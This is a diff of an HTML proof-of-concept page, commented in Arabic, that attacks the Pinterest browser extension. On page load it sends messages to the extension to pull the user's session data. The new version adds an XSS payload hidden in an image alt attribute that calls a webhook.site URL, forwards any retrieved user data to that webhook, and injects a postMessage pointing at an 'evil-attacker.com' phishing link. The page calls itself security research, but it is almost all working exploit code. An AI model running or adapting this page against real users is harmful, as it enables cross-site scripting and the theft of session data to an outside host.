@@ -1,81 +1,86 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pinterest Extension Exploit PoC</title>
+    <title>Security Research - Pinterest Extension PoC</title>
     <style>
-        :root { --pinterest-red: #e60023; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #fafafa; color: #333; display: flex; flex-direction: column; align-items: center; padding: 40px; }
-        .card { background: white; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); padding: 30px; max-width: 500px; text-align: center; }
-        h1 { color: var(--pinterest-red); font-size: 24px; }
-        .img-wrapper { margin: 20px 0; position: relative; display: inline-block; }
-        img { width: 100%; border-radius: 12px; border: 2px solid #eee; transition: 0.3s; }
-        img:hover { border-color: var(--pinterest-red); transform: translateY(-5px); }
-        .console-box { background: #222; color: #0f0; padding: 15px; border-radius: 8px; text-align: left; font-family: monospace; font-size: 12px; overflow-x: auto; margin-top: 20px; min-height: 50px; }
-        .badge { background: #eee; padding: 5px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }
+        body { font-family: sans-serif; line-height: 1.6; padding: 20px; background: #f0f2f5; color: #1c1e21; }
+        .container { max-width: 800px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        h1 { color: #e60023; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+        .exploit-box { background: #fff4f4; border-left: 5px solid #e60023; padding: 15px; margin: 20px 0; }
+        .target-img { width: 300px; border-radius: 8px; cursor: pointer; border: 3px dashed #ccc; transition: 0.3s; }
+        .target-img:hover { border-color: #e60023; transform: scale(1.01); }
+        #status { font-family: monospace; background: #222; color: #0f0; padding: 15px; border-radius: 5px; height: 150px; overflow-y: auto; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h1>Pinterest PoC Test</h1>
-        <p>هذه الصفحة تختبر ثغرة <strong>External Message Leakage</strong></p>
-        
-        <div class="badge">Target ID: gpdjojdkbbmdfjfahjcgigfpmkopogic</div>
+<div class="container">
+    <h1>Pinterest Extension Vulnerability Lab</h1>
+    <p>هذه الصفحة مصممة لاختبار الثغرات الأمنية في إضافة Pinterest (v6.12.0) وإرسال النتائج للتحقق.</p>
 
-        <div class="img-wrapper">
-            <img src="https://picsum.photos/400/300?random=1" alt="Exploit Trigger Image">
-            <p style="font-size: 12px; color: #666;">(مرر الماوس فوق الصورة لتنشيط الإضافة)</p>
-        </div>
-
-        <div class="console-box" id="output">
-            > في انتظار استجابة الإضافة...
-        </div>
+    <div class="exploit-box">
+        <h3>1. اختبار XSS via Image Metadata</h3>
+        <p>مرر الماوس فوق الصورة واضغط على زر Pinterest (إذا كان الكود مصاباً سيتم تنفيذ JavaScript).</p>
+        <img src="https://picsum.photos/400/300" 
+             alt='"><img src=x onerror="fetch(`https://webhook.site/f2574412-4c58-4c01-ad4c-67882c509104?type=XSS_SUCCESS`)">' 
+             class="target-img">
     </div>
 
-    <script>
-        // المعرف الرسمي للإضافة من متجر كروم
-        const EXTENSION_ID = "gpdjojdkbbmdfjfahjcgigfpmkopogic";
-        const output = document.getElementById('output');
+    <div class="exploit-box">
+        <h3>2. اختبار PostMessage Data Injection</h3>
+        <button onclick="triggerPostMessage()">تشغيل حقن البيانات (PostMessage)</button>
+    </div>
 
-        function log(msg, data = null) {
-            output.innerHTML = `> ${msg}`;
-            if (data) {
-                console.log("[!] Data Leaked:", data);
-                output.innerHTML += `<br><span style="color: yellow;">[تم العثور على بيانات - تفقد Console]</span>`;
+    <div id="status">> جاهز للاختبار...</div>
+</div>
+
+<script>
+    const WEBHOOK_URL = "https://webhook.site/f2574412-4c58-4c01-ad4c-67882c509104";
+    const EXTENSION_ID = "gpdjojdkbbmdfjfahjcgigfpmkopogic";
+    const logDiv = document.getElementById('status');
+
+    function report(msg, data = {}) {
+        logDiv.innerHTML += `<br>> ${msg}`;
+        fetch(`${WEBHOOK_URL}?log=${encodeURIComponent(msg)}`, {
+            method: 'POST',
+            body: JSON.stringify(data)
+        });
+    }
+
+    // --- تجربة الثغرة 1: PostMessage Injection ---
+    function triggerPostMessage() {
+        report("جاري محاولة حقن رسالة خبيثة عبر window.postMessage...");
+        window.postMessage({
+            type: "PINTEREST_SAVE",
+            data: {
+                url: "https://evil-attacker.com/phishing",
+                src: "https://picsum.photos/200/200",
+                description: "This data was injected via an external site!",
+                isThroughExtension: true
             }
+        }, "*");
+    }
+
+    // --- تجربة الثغرة 2: External Messaging (Cross-Extension) ---
+    async function testExternalMessaging() {
+        if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage) {
+            report("محاولة التواصل المباشر مع Background Script...");
+            chrome.runtime.sendMessage(EXTENSION_ID, { action: "FETCH_USER" }, (response) => {
+                if (chrome.runtime.lastError) {
+                    report("فشل الاتصال المباشر (قد تكون الحماية مفعلة): " + chrome.runtime.lastError.message);
+                } else {
+                    report("نجاح! تم سحب بيانات المستخدم!", response);
+                }
+            });
         }
+    }
 
-        async function triggerExploit() {
-            // التحقق من وجود المتصفح يدعم التواصل مع الإضافات
-            if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage) {
-                
-                log("جاري محاولة سحب بيانات المستخدم...");
+    // تشغيل الاختبارات التلقائية عند التحميل
+    window.onload = () => {
+        testExternalMessaging();
+    };
+</script>
 
-                // إرسال رسالة مباشرة إلى خلفية الإضافة (Background Script)
-                // نحن نستغل دالة gr() التي لا تتحقق من مصدر الرسالة
-                chrome.runtime.sendMessage(EXTENSION_ID, {
-                    action: "FETCH_USER",
-                    type: "SIGN_IN"
-                }, (response) => {
-                    if (chrome.runtime.lastError) {
-                        log("خطأ: " + chrome.runtime.lastError.message + " (تأكد من تثبيت الإضافة)");
-                    } else if (response) {
-                        log("نجاح! تم تسريب البيانات:", response);
-                        alert("نجح الاختراق! تم سحب بيانات الجلسة من إضافة Pinterest.\nتفقد المتصفح Console لرؤية التفاصيل.");
-                    } else {
-                        log("تم إرسال الرسالة ولكن لم يتم إرجاع بيانات. (قد لا تكون مسجلاً للدخول)");
-                    }
-                });
-
-            } else {
-                log("المتصفح لا يدعم sendMessage.");
-            }
-        }
-
-        // تشغيل المحاولة بعد ثانيتين لضمان تحميل الإضافة تماماً
-        setTimeout(triggerExploit, 2000);
-    </script>
 </body>
 </html>
